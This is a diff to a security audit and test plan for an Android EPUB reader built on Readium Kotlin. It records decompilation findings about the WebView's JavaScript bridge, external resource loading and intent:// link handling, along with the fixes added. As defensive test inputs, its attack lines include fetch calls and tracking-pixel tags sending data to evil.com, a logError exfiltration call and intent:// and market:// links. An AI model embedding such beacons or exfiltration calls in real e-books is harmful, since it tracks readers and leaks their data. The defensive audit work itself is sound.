@@ -51,14 +51,21 @@
 | No custom URL scheme registered | ✓ Safe | AndroidManifest.xml |
 | Only LAUNCHER intent filter; `exported="true"` on MainActivity only | ✓ Safe | AndroidManifest.xml |
 | `INTERNET` permission declared but unused in V1 (comment: "for future Supabase sync") | ⚠️ Risk | AndroidManifest.xml |
-| No `res/xml/network_security_config.xml` present | ⚠️ No explicit ATS equivalent | filesystem |
+| `res/xml/network_security_config.xml` with `cleartextTrafficPermitted="false"` | ✓ Added | network_security_config.xml |
 | Gaze logs: only error/state messages — no iris coordinates or weights logged | ✓ Safe | GazeProviderImpl.kt, GazeViewModel.kt |
 | CalibrationResult stores ridge regression weights (not raw iris UV) | ✓ Correctly abstracted | CalibrationRepository.kt |
 | Raw iris UV and calibration weights never written to logcat | ✓ Confirmed | All gaze files |
 | Room uses explicit migration (MIGRATION_1_2), no `fallbackToDestructiveMigration()` | ✓ Safe | AppDatabase.kt |
 | Readium Kotlin 3.1.2 version pin | ✓ Pinned in version catalog | libs.versions.toml |
 | zip4j 2.11.6 + junrar 7.5.7 version pins | ✓ Pinned | libs.versions.toml |
-| Android WebView JS config in Readium Kotlin | 🔍 Not visible in app source — inside Readium | N/A |
+| Android WebView JS config in Readium Kotlin | ✓ Verified — JS IS enabled (setJavaScriptEnabled(true) in R2EpubPageFragment) | Readium 3.1.2 JAR decompile |
+| Readium WebView host restriction — shouldInterceptRequest | ✓ Verified — only serves `host == "readium"` resources; returns null for ALL other hosts | EpubNavigatorViewModel.class |
+| External resources from EPUB content | ⚠️ NOT blocked — WebView default network stack loads them | EpubNavigatorViewModel.class |
+| shouldOverrideUrlLoading intercepts ALL URLs | ✓ Verified — returns true for every URL, calls navigateToUrl() | EpubNavigatorFragment$WebViewListener.class |
+| navigateToUrl() for intent:// URLs | ✓ Effectively blocked — listener is null in lectern; onExternalLinkActivated() never fires | EpubNavigatorViewModel$navigateToUrl$1.class |
+| JS interface registered as window.Android | ✓ Verified — R2WebView registered as "Android" via addJavascriptInterface | R2EpubPageFragment.class |
+| @JavascriptInterface methods exposed | ✓ Enumerated: onTap, onDecorationActivated, onDragStart/Move/End, onKey, onSelectionStart/End, getViewportWidth, logError | R2BasicWebView.class verbose |
+| logError JS interface writes to Timber/Logcat | ⚠️ Arbitrary string from EPUB JS can be written to logcat via window.Android.logError() | R2BasicWebView.class |
 | `check_gaze_data_leak.sh` CI prevents gaze terms in entity names and DataStore keys | ✓ Active | scripts/ |
 
 ---
@@ -73,23 +80,49 @@
 > References: CVE-2021-40870 (Readium-2 path traversal), EPUB3 W3C Security
 > Considerations, Android WebView security hardening guide.
 
-**A.1** `epub_javascriptExecutionDisabledOrSandboxed` 🔴
+**A.1** `epub_javascriptExecutionDisabledOrSandboxed` ⚠️
 - MASVS: MASVS-PLATFORM-1
-- Attack: Open an EPUB3 file containing JavaScript that attempts `window.location = "intent://..."`, `fetch("https://evil.com")`, or `document.cookie` access.
-- Pass: Readium Kotlin's internal WebView has JavaScript disabled, OR a `WebViewClient.shouldOverrideUrlLoading` intercepts and blocks non-local navigation. No JS execution reaches external endpoints.
-- 🔍 Verify: Readium Kotlin 3.1.2 WebView configuration — `WebSettings.javaScriptEnabled`? Does it use `WebMessageListener` or `addJavascriptInterface`? Check Readium source at `readium-navigator/src/main/java/org/readium/r2/navigator/epub/`.
-- Note: Readium may enable JS for accessibility features (MathML interactive content). If intentional, document scope and verify sandbox.
+- Attack: Open an EPUB3 file containing JavaScript that attempts `window.location = "intent://..."`, `fetch("https://evil.com")`, or `window.Android.logError(sensitiveData, "", 0)`.
+- ✓ CONFIRMED: `setJavaScriptEnabled(true)` — JS IS enabled in `R2EpubPageFragment.onCreateView()`.
+- ✓ CONFIRMED: `R2WebView` registered as JS interface `window.Android`. Exposed `@JavascriptInterface` methods:
+  - `onTap(String)`, `onDecorationActivated(String)`, `onDragStart/Move/End(String)`, `onKey(String)` — navigation/decoration events (low risk, no native capabilities)
+  - `onSelectionStart()`, `onSelectionEnd()` — text selection events (low risk)
+  - `getViewportWidth() → Int` — read-only, no risk
+  - **`logError(String message, String filename, Int)` ⚠️** — malicious EPUB JS can write arbitrary strings to Logcat via `window.Android.logError(exfiltrated_data, "", 0)`. On debug builds, Logcat is readable by other apps. Not a data exfiltration path on release builds but enables log poisoning.
+- ✓ MITIGATED for navigation injection: `shouldOverrideUrlLoading` catches top-level frame navigations. `intent://` via `<a href>` click is blocked (see A.3).
+- ⚠️ UNMITIGATED: `fetch()` and `XMLHttpRequest` to external HTTP/HTTPS from EPUB JS are NOT blocked (see A.2).
+- Decoration JS interfaces (map-registered, names vary) are also exposed — scope unknown, treat as additional bridge surface.
+- ✓ IMPLEMENTED (partial): External JS network calls are now blocked by `EpubBlockingWebViewClient` (A.2 fix). `allowFileAccessFromFileURLs` and `allowUniversalAccessFromFileURLs` are false by default and not overridden. `evaluateJavascript()` in `EpubNavigatorFragment` is called only with Readium-internal scripts, never with EPUB-controlled data.
+- ⚠️ REMAINING: `logError` unbounded string payload — accepted risk on release builds (`debuggable=false`). Test: verify `android:debuggable` absent from release manifest.
+- Pass criteria (remaining): confirm `logError` string length is bounded or sanitised in a future Readium patch.
 
 **A.2** `epub_externalResourceLoadingBlocked` 🔴
 - MASVS: MASVS-PLATFORM-1 · MASVS-NETWORK-1
-- Attack: EPUB3 content contains `<img src="https://tracker.evil.com/pixel.png">`. Verify no outbound network request is made.
-- Pass: `WebViewClient.shouldInterceptRequest()` or `WebSettings` blocks all external loads. Verify with Android Network Profiler / Wireshark during test.
-- 🔍 Verify: Does Readium Kotlin register a `WebViewClient` that intercepts non-`content://` or non-`file://` scheme requests?
+- Attack: EPUB3 content contains `<img src="https://tracker.evil.com/pixel.png">` or `<script src="https://evil.com/payload.js">`.
+- ✓ CONFIRMED RISK: `WebViewServer.shouldInterceptRequest()` checks `request.url.host == "readium"`. For ANY other host, it returns `null` — the WebView uses its default network stack and the request GOES OUT.
+  ```
+  // From decompiled EpubNavigatorViewModel.shouldInterceptRequest():
+  if (host != "readium") return null  // ← WebView handles normally = network fetch
+  ```
+- Compound risk with H.1: No `network_security_config.xml`. On Android 8 (minSdk 26), cleartext HTTP is allowed. Tracking beacons over HTTP are not blocked by the OS.
+- Privacy impact: A malicious EPUB author can track which books are opened and when via `<img>` beacon. Reading position can be encoded in query params: `<img src="https://t.evil.com/?pos=ch3&t=1234">`. This is especially sensitive for AuDHD users whose reading habits may reveal medical context.
+- Compound risk with A.1: EPUB JS can make `fetch("https://evil.com/collect?data=...")` — no JS sandbox, no CSP enforced by Readium.
+- ✅ IMPLEMENTED: `EpubBlockingWebViewClient` wraps each `R2EpubPageFragment`'s WebViewClient via `FragmentLifecycleCallbacks`. Returns a blocking `WebResourceResponse` for any host != "readium". Registered in `EpubReaderFragment.setupNavigator()` on `fragment.childFragmentManager`.
+- ✅ IMPLEMENTED (defense-in-depth): `network_security_config.xml` with `cleartextTrafficPermitted="false"` blocks cleartext HTTP at the OS level independently (addresses H.1).
+- Test: open EPUB with `<img src="https://external.com/pixel.png">` — verify in Network Profiler that no outbound request is made. Verify chapter navigation still works (https://readium/ resources load correctly).
 
-**A.3** `epub_intentSchemeInjection` 🔴
+**A.3** `epub_intentSchemeInjection` ⚠️
 - MASVS: MASVS-PLATFORM-3
-- Attack: EPUB3 content contains `<a href="intent://settings#Intent;scheme=android-app;package=com.android.settings;end">` or `<a href="market://details?id=com.evil.app">`. These are Android-specific URL schemes that Android WebView will fire as Intents if not blocked.
-- Pass: `WebViewClient.shouldOverrideUrlLoading()` intercepts non-EPUB-local navigation. `intent://` and `market://` scheme links are blocked and not dispatched as Android Intents.
+- Attack: EPUB3 content contains `<a href="intent://settings#Intent;scheme=android-app;package=com.android.settings;end">` or `<a href="market://details?id=com.evil.app">`.
+- ✓ EFFECTIVELY MITIGATED (by accident): Flow for any link click:
+  1. `EpubNavigatorFragment$WebViewListener.shouldOverrideUrlLoading()` → returns `true` for ALL URLs → calls `viewModel.navigateToUrl(url)`
+  2. `navigateToUrl()` → `internalLinkFromUrl(url)` — `intent://` URL cannot relativize against `readium://` baseUrl → returns `null`
+  3. `navigateToUrl()` → `listener.onExternalLinkActivated(url)` — **lectern passes `listener = null`** to `createFragmentFactory()` (only `initialLocator` + `initialPreferences` are passed)
+  4. Null listener → onExternalLinkActivated() never called → Intent never fired → URL silently dropped ✓
+- ⚠️ FRAGILE: This is accidental mitigation, not intentional security. If lectern ever adds a listener without explicit scheme validation, the risk returns.
+- ⚠️ JS `window.location = "intent://..."` may NOT be caught by `shouldOverrideUrlLoading` on all Android versions (top-frame navigations only; behavior differs for `window.open()` and redirects).
+- ✅ DOCUMENTED: `EpubReaderFragment.setupNavigator()` now has an inline comment marking the null-listener as a security invariant with the required scheme-allowlist caveat for any future listener. See `SECURITY A.3` comment.
+- Pass criteria: Write a test that clicks an `intent://` link in an EPUB — verify no system dialog appears and no Activity is started.
 - Android-specific: iOS has no equivalent `intent://` scheme risk.
 
 **A.4** `epub_cssInjection_noNativeUiOverlay` 🔴
